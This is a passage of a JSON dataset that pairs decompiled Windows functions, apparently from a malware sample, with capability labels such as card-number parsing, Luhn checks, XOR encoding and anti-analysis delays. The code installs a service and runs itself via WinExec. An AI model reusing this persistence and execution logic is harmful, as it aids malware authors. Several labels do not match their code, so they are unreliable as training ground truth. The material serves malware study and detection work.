(unaff_EBX >> 8) << 8) | 0x604;\n    bVar11 = (uVar5 >> 8) + uVar5 < '\\0';\n    uVar10 = 0x2c;\n    uVar13 = 0x23;\n    uVar18 = 0x40;\n    uVar19 = 0;\n    fcn.00401890(0x4103f8, 0x11, 0x41f5c4, 0x11);\n    if ((bVar11) || (!bVar11)) {\n        uVar10 = 0x13;\n        uVar13 = 0;\n        uVar18 = 0;\n        uVar19 = 0;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00401890(0x4103f8, 0x11, 0x41f5d8, CONCAT13(uVar19, CONCAT12(uVar18, CONCAT11(uVar13, uVar10))));\n    fcn.00401890(0x4103f8, 0x11, 0x41f5ec, 0x14);\n    fcn.00401890(0x4103f8, 0x11, 0x41f600, 0x33);\n    cVar14 = extraout_DX_00 >> 8;\n    cVar16 = SCARRY1(extraout_DX_00, cVar14);\n    cVar14 = extraout_DX_00 + cVar14;\n    cVar15 = cVar14 < '\\0';\n    bVar11 = cVar14 == '\\0';\n    uVar10 = 0xbd;\n    uVar13 = 0x23;\n    uVar18 = 0x40;\n    uVar19 = 0;\n    fcn.00401890(0x4103f8, 0x11, 0x41f634, 10);\n    if ((bVar11 || cVar16 != cVar15) || (!bVar11 && cVar16 == cVar15)) {\n        uVar10 = 4;\n        uVar13 = 0;\n        uVar18 = 0;\n        uVar19 = 0;\n    }\n    fcn.00401890(0x4103f8, 0x11, 0x41f640, CONCAT13(uVar19, CONCAT12(uVar18, CONCAT11(uVar13, uVar10))));\n    uVar6 = (unaff_EBX & 0xff00) >> 8;\n    uVar10 = 0;\n    cVar15 = '\\0';\n    uVar1 = extraout_DL_00 ^ uVar6 | 0x67;\n    cVar14 = uVar1 < '\\0';\n    uVar13 = uVar1 == 0;\n    puVar3 = fcn.00401890(0x4103f8, 0x11, 0x41f644, 5);\n    if (cVar15 != cVar14) goto code_r0x00402424;\n    if (cVar15 == cVar14) goto code_r0x00402424;\n    out(0xc4, puVar3);\n    *ppuVar9 = puVar3;\n    do {\n        uVar10 = uVar6 < *puVar3;\n        uVar13 = uVar6 == *puVar3;\ncode_r0x00402424:\n        fcn.00401890(0x4103f8, 0x11, 0x41f64c, 6);\n        if ((!uVar10 && !uVar13) && (uVar10 || uVar13)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        uVar21 = fcn.00401890(0x4103f8, 0x11, 0x41f654, 0xc);\n        bVar11 = false;\n        bVar12 = (POPCOUNT(uVar21 & 0x59) & 1U) == 0;\n        fcn.00401890(0x4103f8, 0x11, 0x41f660, 0xc);\n        if ((bVar12) || (!bVar12)) break;\n        ppuVar8 = segment(in_SS, *0x10 + -0x2d);\n        puVar3 = *ppuVar8;\n        if (bVar11) goto code_r0x004024bb;\n    } while (bVar12);\n    fcn.00401890(0x4103f8, 0x11, 0x41f698, 0x2a);\ncode_r0x004024bb:\n    fcn.00401890(0x4103f8, 0x11, 0x41f6c4, 0xb);\n    fcn.00401890(0x4103f8, 0x11, 0x41f720, 0x41);\n    fcn.00401890(0x4103f8, 0x11, 0x41f764, 0x33);\n    fcn.00401890(0x4103f8, 0x11, 0x41f798, 0x4b);\n    fcn.00401890(0x4103f8, 0x11, 0x41f7e4, 0x39);\n    fcn.00401890(0x4103f8, 0x11, 0x41f820, 8);\n    fcn.00401890(0x4103f8, 0x11, 0x41f828, 0x14);\n    return;\n}\n",
        "token_count": 4183
    },
    "00402910": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402910(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar2 = fcn.00403280(uVar1, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n    return uVar2;\n}\n",
        "token_count": 105
    },
    "00403ee0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040ab) overlaps instruction at (ram,0x004040a7)\n// \n// WARNING: Type propagation algorithm not settling\n\nuint64_t __cdecl fcn.00403ee0(int16_t *arg_8h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    unkbyte6 Var3;\n    uchar uVar4;\n    uint *puVar5;\n    char **ppcVar6;\n    int32_t in_ECX;\n    int32_t *piVar7;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    uint32_t uVar8;\n    int32_t extraout_ECX_01;\n    int32_t iVar9;\n    uint32_t in_EDX;\n    int32_t *extraout_EDX;\n    uint extraout_EDX_00;\n    uint *puVar10;\n    int32_t *piVar11;\n    uint *puVar12;\n    uint *unaff_EDI;\n    int32_t *piVar13;\n    uint *puVar14;\n    uint16_t in_SS;\n    uint8_t in_AF;\n    bool bVar15;\n    bool bVar16;\n    bool bVar17;\n    uint64_t uVar18;\n    ulong uVar19;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uchar auStackY60 [12];\n    int32_t var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return in_EDX << 0x20;\n    }\n    piVar7 = *(arg_8h + 0x1e) + arg_8h;\n    if (*piVar7 != 0x4550) {\n        return in_EDX << 0x20;\n    }\n    if (piVar7[0x16] != 0) {\n        return in_EDX << 0x20;\n    }\n    piVar11 = 0x40;\n    bVar16 = SBORROW4(*(arg_8h + 0x1e), 0x80);\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return in_EDX << 0x20;\n    }\n    if ((!bVar16) && (bVar16)) {\n        *unaff_EDI = in_stack_00000008;\n        return CONCAT44(unaff_retaddr, in_stack_00000008);\n    }\n    uVar8 = *(arg_8h + 0x1e);\n    bVar16 = (POPCOUNT(uVar8 - 0xc0 & 0xff) & 1U) == 0;\n    if (uVar8 < 0xc0) {\n        piVar11 = uVar8 - 0x80;\n    }\n    if ((bVar16) || (!bVar16)) {\ncode_r0x00404006:\n        uVar18 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        var_4h = uVar18;\n        piVar7 = extraout_ECX;\n        if (var_4h == 0) {\n            return uVar18 & 0xffffffff00000000;\n        }\n    }\n    else {\n        puVar5 = segment(in_SS, *0x10 + -0x14);\n        uVar18 = CONCAT44(0xb7bc9ea5, *puVar5);\n        var_4h = in_ECX;\n        if (uVar8 >= 0xc0) {\n            if (bVar16) {\n                return CONCAT44(0xb7bc9ea5, *puVar5);\n            }\n            unaff_EDI = 0xb7bc9ea5;\n            goto code_r0x00404006;\n        }\n    }\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    iVar9 = uVar18;\n    piVar13 = NULL;\n    bVar16 = false;\n    bVar17 = false;\n    bVar15 = piVar11 == NULL;\n    if (!bVar15) {\n        do {\n            if ((bVar15) || (!bVar15)) {\n                iVar9 = (*pcVar2)();\n            }\n            uVar8 = unaff_EDI & 0xffff0000 | in_SS;\n            unaff_EDI = NULL;\n            piVar7 = 0xff;\n            uVar18 = CONCAT44(iVar9 % 0xff, var_4h);\n            piVar13 = uVar8 + 1;\n            bVar16 = piVar13 < piVar11;\n            bVar17 = SBORROW4(piVar13, piVar11);\n            bVar15 = piVar13 == piVar11;\n            *(uVar8 + var_4h) = iVar9 % 0xff;\n            iVar9 = var_4h;\n        } while (bVar16);\n    }\n    puVar5 = uVar18;\n    if ((bVar17) || (!bVar17)) {\ncode_r0x00404087:\n        puVar12 = puVar5;\n        puVar10 = arg_8h + 0x40;\n        for (uVar8 = piVar11 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n            *puVar10 = *puVar12;\n            puVar12 = puVar12 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        uVar8 = piVar11 & 3;\n        bVar16 = false;\n        bVar15 = uVar8 == 0;\n        for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n            *puVar10 = *puVar12;\n            puVar12 = puVar12 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        if (!bVar15) goto code_r0x004040a2;\n    }\n    else {\n        puVar10 = piVar13 + 1;\n        uVar4 = in(uVar18 >> 0x20);\n        *piVar13 = uVar4;\n        if (bVar16 || bVar15) {\n            puVar5 = 0x8b08558b;\n            pcVar2 = swi(4);\n            piVar11 = piVar7;\n            arg_8h = uVar18 >> 0x20;\n            if (bVar17 == true) {\n                uVar19 = (*pcVar2)();\n                arg_8h = uVar19 >> 0x20;\n                puVar5 = uVar19;\n                piVar11 = extraout_ECX_00;\n            }\n            goto code_r0x00404087;\n        }\n        *puVar5 = *puVar5 + uVar18;\n        uVar19 = fcn.004039a0(in_stack_00000014, in_stack_00000018, 0x41f450, 7);\n        pcVar2 = _sym.imp.MSVCRT.dll_rand;\n        piVar11 = uVar19 >> 0x20;\n        uVar8 = uVar19;\n        bVar16 = uVar8 < 0;\n        bVar15 = uVar8 == 0;\n        if (bVar15) {\n            return ZEXT48(piVar11) << 0x20;\n        }\n        if ((uVar8 < 1) || (0 < uVar8)) {\n            puVar5 = &stack0xffffffd9;\n            for (iVar9 = 7; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            uVar8 = 0;\n            bVar16 = true;\n            puVar5 = &stack0xfffffffc;\n            do {\n                puVar10 = puVar5;\n                if ((!bVar16) && (bVar16)) {\n                    puVar12 = &stack0xffffffe8;\n                    puVar10 = &stack0xffffffe8;\n                    cVar1 = '\\x10';\n                    do {\n                        puVar5 = puVar5 + -1;\n                        puVar12 = puVar12 + -1;\n                        *puVar12 = *puVar5;\n                        cVar1 = cVar1 + -1;\n                    } while ('\\0' < cVar1);\n                }\n                uVar4 = (*pcVar2)();\n                *(puVar10 + (uVar8 - 0x24)) = uVar4;\n                uVar8 = uVar8 + 1;\n                bVar16 = uVar8 == 0x20;\n                puVar5 = puVar10;\n            } while (uVar8 < 0x20);\n            puVar5 = puVar10[-1];\n            puVar12 = puVar10 + -9;\n            puVar14 = puVar5;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar14 = *puVar12;\n                puVar12 = puVar12 + 1;\n                puVar14 = puVar14 + 1;\n            }\n            fcn.00401050(puVar10[2], puVar10[3], puVar10[4], puVar10[5], puVar10 + -9, 0x20, puVar5);\n            fcn.00403d10(puVar10[6], puVar10[7]);\n            return CONCAT44(extraout_EDX_00, 1);\n        }\n        puVar5 = uVar8 & 0xffff0000 | uVar19 + (9 < (uVar19 & 0xf) | in_AF) * '\\x06' & 0xff0f;\n        if (extraout_ECX_01 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\ncode_r0x004040a2:\n        if (bVar15 || bVar16) {\n            Var3 = *((puVar5 & 0x83000006) + puVar10 * 4);\n            ppcVar6 = Var3;\n            *ppcVar6 = *ppcVar6 + ppcVar6;\n            *ppcVar6 = *ppcVar6 + Var3;\n            goto code_r0x004040b9;\n        }\n    }\n    func_0x004046d6();\n    ppcVar6 = 0x1;\n    piVar11 = extraout_EDX;\ncode_r0x004040b9:\n    return CONCAT44(piVar11, ppcVar6);\n}\n",
        "token_count": 2384
    },
    "00403320": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040340b) overlaps instruction at (ram,0x0040340a)\n// \n// WARNING: Removing unreachable block (ram,0x004034a5)\n\nuint32_t __cdecl fcn.00403320(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    uint32_t *puVar2;\n    uint16_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t in_EDX;\n    int32_t iVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint32_t unaff_EDI;\n    uint16_t in_ES;\n    uint16_t in_SS;\n    bool bVar13;\n    bool in_ZF;\n    bool bVar14;\n    bool bVar15;\n    uint uStack24183;\n    uint16_t uStack24179;\n    uint16_t uStack24177;\n    uchar auStack24175 [24151];\n    uint auStack24 [2];\n    char cVar5;\n    \n    puVar10 = &stack0xfffffffc;\n    puVar12 = &stack0xfffffffc;\n    if ((!in_ZF) && (puVar12 = &stack0xfffffffc,  in_ZF)) {\n        puVar11 = auStack24 + 1;\n        puVar12 = auStack24 + 1;\n        cVar5 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar10;\n            cVar5 = cVar5 + -1;\n        } while ('\\0' < cVar5);\n    }\n    puVar1 = puVar12[2];\n    *puVar1 = 0x3f;\n    puVar1[1] = 0xb2;\n    uVar6 = puVar12[2];\n    *(uVar6 + 2) = 0xf2;\n    bVar15 = false;\n    bVar14 = false;\n    bVar13 = (POPCOUNT(in_EDX >> 8 & 0x12) & 1U) == 0;\n    iVar9 = puVar12[2];\n    *(iVar9 + 3) = 0x56;\n    if ((bVar13) || (!bVar13)) {\n        *(iVar9 + 4) = 0xef;\n        uVar7 = uVar6;\n    }\n    else {\n        puVar12 = *0xc617b43a;\n        iVar9 = iVar9 + 1;\n        cVar5 = in_EDX + 1;\n        bVar15 = SCARRY1(cVar5, -0x11);\n        uVar4 = cVar5 - 0x11;\n        bVar14 = uVar4 < '\\0';\n        uVar7 = in_EDX + 1 & 0xffffff00 | uVar4;\n        in_EDX = uVar6;\n    }\n    if ((bVar15 == bVar14) && (bVar15 != bVar14)) {\n        *(unaff_EDI | puVar12) = uVar7;\n        in_EDX = in_EDX & 0xffffff00;\n        uVar7 = uVar7 & 0xffff0000 | uVar7 + (uVar7 >> 8) * 'y';\n        in_SS = uStack24179;\n        uStack24179 = in_ES;\n    }\n    *(iVar9 + 5) = 0x46;\n    do {\n        uVar3 = uStack24179;\n        puVar10 = &uStack24179;\n        uVar6 = CONCAT22(uStack24177, uStack24179);\n        *(iVar9 + 6) = 0x91;\n        *(iVar9 + 7) = 0xae;\n        *(iVar9 + 8) = 0x88;\n        bVar13 = (POPCOUNT(uVar7 & 0xcb) & 1U) == 0;\n        *(iVar9 + 9) = 0xd5;\n        if ((!bVar13) && (bVar13)) {\n            cVar5 = '\\x1e';\n            do {\n                puVar12 = puVar12 + -1;\n                puVar10 = puVar10 + -1;\n                *puVar10 = *puVar12;\n                cVar5 = cVar5 + -1;\n            } while ('\\0' < cVar5);\n            uVar6 = in(0x78);\n            return uVar6;\n        }\n        *(iVar9 + 10) = 0x10;\n        if ((bVar13) || (!bVar13)) {\n            *(iVar9 + 0xb) = 0xe6;\n            uVar8 = uVar7;\n        }\n        else {\n            puVar12 = *0xc617b43a;\n            iVar9 = iVar9 + 1;\n            bVar13 = (POPCOUNT(auStack24175 & 0xff) & 1U) == 0;\n            uVar8 = in_EDX + 1;\n            in_EDX = uVar7;\n        }\n        if (bVar13) goto code_r0x00403484;\n        uStack24179 = uVar8;\n        uStack24177 = uVar8 >> 0x10;\n        if (!bVar13) goto code_r0x00403484;\n        puVar2 = segment(in_SS, *0x10 + -0x5e6f);\n        uVar7 = *puVar2;\n        in_EDX = 0xb7bc9ea5;\n    } while (bVar13);\n    uVar8 = uVar7;\ncode_r0x00403484:\n    *(iVar9 + 0xc) = 0xff;\n    uStack24179 = uVar3;\n    uStack24177 = uVar8;\n    while( true ) {\n        uVar6 = uVar6 & 0xffff0000 | uStack24179;\n        uVar8 = uVar8 & 0xffff0000;\n        *(iVar9 + 0xd) = 0x54;\n        in_EDX = in_EDX & 0xffff;\n        *(iVar9 + 0xe) = 0x26;\n        bVar13 = (uStack24177 + iVar9 | 0x11a9) != 0;\n        *(iVar9 + 0xf) = 0x2c;\n        if ((bVar13) && (!bVar13)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(iVar9 + 0x10) = 0xd8;\n        uStack24179 = uVar8 >> 0x10;\n        *(iVar9 + 0x11) = 6;\n        if ((in_EDX < 'R') || ('Q' < in_EDX)) break;\n        uStack24177 = in_EDX;\n        if (uVar6 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(iVar9 + 0x12) = 0x9a;\n    *(iVar9 + 0x13) = 0x79;\n    bVar13 = ((uStack24177 & 0xff | ((uStack24177 >> 8) - iVar9) + 0x4d << 8) & 0x26ae) != 1;\n    *(iVar9 + 0x14) = 0x3d;\n    if ((bVar13) && (!bVar13)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *puVar12[3] = 0x15;\n    return uVar8 | uStack24177;\n}\n",
        "token_count": 1751
    },
    "004044d0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004044d0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint arg_10h;\n    uchar *arg_14h;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    arg_14h = auStack1812;\n    arg_10h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, arg_14h, 0x104);\n    fcn.00402960(&uStack2112, 6, arg_10h, arg_14h);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x41f840, acStack1304, &uStack2112);\n    uStack2088 = 0x41f8f8;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x41f910;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00403c10(auStack1564, 0x41f83c, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1896
    },
    "004040c0": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040ab) overlaps instruction at (ram,0x004040a7)\n// \n// WARNING: Type propagation algorithm not settling\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar ** __cdecl fcn.004040c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    unkbyte6 Var2;\n    code *pcVar3;\n    uchar uVar4;\n    char **ppcVar5;\n    int32_t in_EAX;\n    char *pcVar6;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint *unaff_ESI;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *unaff_EDI;\n    uint *puVar12;\n    uint8_t in_AF;\n    bool bVar13;\n    uchar auStackY92 [8];\n    uchar uStack40;\n    uint var_23h;\n    uint32_t var_4h;\n    \n    if ((!SBORROW4(&stack0xfffffffc, 0x24)) && (SBORROW4(&stack0xfffffffc, 0x24))) {\n        pcVar6 = in_EAX + 1;\n        *unaff_EDI = *unaff_ESI;\n        *pcVar6 = *pcVar6 + pcVar6;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    var_4h = fcn.004039a0(arg_18h, arg_1ch, 0x41f450, 7);\n    pcVar3 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h != 0) {\n        if ((0 < var_4h) && (var_4h < 1)) {\n            if (extraout_ECX == 0) {\n                if (var_4h < 1) {\n                    Var2 = *(((var_4h & 0xffff0000 | var_4h + (9 < (var_4h & 0xf) | in_AF) * '\\x06' & 0xff0f) &\n                             0x83000006) + unaff_EDI * 4);\n                    ppcVar5 = Var2;\n                    *ppcVar5 = *ppcVar5 + ppcVar5;\n                    *ppcVar5 = *ppcVar5 + Var2;\n                }\n                else {\n                    func_0x004046d6();\n                    ppcVar5 = 0x1;\n                }\n                return ppcVar5;\n            }\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        uStack40 = 0;\n        puVar8 = &var_23h;\n        for (iVar7 = 7; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        *puVar8 = 0;\n        *(puVar8 + 2) = 0;\n        uVar10 = 0;\n        bVar13 = true;\n        puVar8 = &stack0xfffffffc;\n        do {\n            puVar9 = puVar8;\n            if ((!bVar13) && (bVar13)) {\n                puVar11 = &stack0xffffffc8;\n                puVar9 = &stack0xffffffc8;\n                cVar1 = '\\x10';\n                do {\n                    puVar8 = puVar8 + -1;\n                    puVar11 = puVar11 + -1;\n                    *puVar11 = *puVar8;\n                    cVar1 = cVar1 + -1;\n                } while ('\\0' < cVar1);\n            }\n            uVar4 = (*pcVar3)();\n            *(puVar9 + (uVar10 - 0x24)) = uVar4;\n            uVar10 = uVar10 + 1;\n            bVar13 = uVar10 == 0x20;\n            puVar8 = puVar9;\n        } while (uVar10 < 0x20);\n        puVar8 = puVar9[-1];\n        puVar11 = puVar9 + -9;\n        puVar12 = puVar8;\n        for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar12 = *puVar11;\n            puVar11 = puVar11 + 1;\n            puVar12 = puVar12 + 1;\n        }\n        fcn.00401050(puVar9[2], puVar9[3], puVar9[4], puVar9[5], puVar9 + -9, 0x20, puVar8);\n        fcn.00403d10(puVar9[6], puVar9[7]);\n        return 0x1;\n    }\n    return NULL;\n}\n",
        "token_count": 1123
    },
    "00404280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404280(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403bb0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x406010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "004011d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401224) overlaps instruction at (ram,0x00401223)\n// \n\nvoid __cdecl fcn.004011d0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar4;\n    char extraout_DL;\n    char cVar5;\n    char extraout_DL_00;\n    char *in_EDX;\n    char unaff_BH;\n    uint8_t uVar6;\n    bool bVar7;\n    uint32_t uVar3;\n    \n    *in_EDX = *in_EDX + ']';\n    uVar4 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, 0x98, 0, 0, 0, 0);\n    uVar6 = 0;\n    bVar7 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    if (uVar4 != 0) {\n        if ((bVar7) || (cVar5 = extraout_DL,  !bVar7)) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar4);\n            uVar4 = 1;\n            cVar5 = extraout_DL_00;\n        }\n        puVar1 = uVar4 - 1;\n        uVar2 = *puVar1;\n        uVar3 = *puVar1;\n        *puVar1 = uVar3 + 0x15 + uVar6;\n        *(uVar4 + 0x40) = *(uVar4 + 0x40) + cVar5 + (0xffffffea < uVar2 || CARRY4(uVar3 + 0x15, uVar6));\n        *(uVar4 + 1) = *(uVar4 + 1) + unaff_BH;\n        return;\n    }\n    return;\n}\n",
        "token_count": 456
    },
    "00401890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encode data using XOR"
        ],
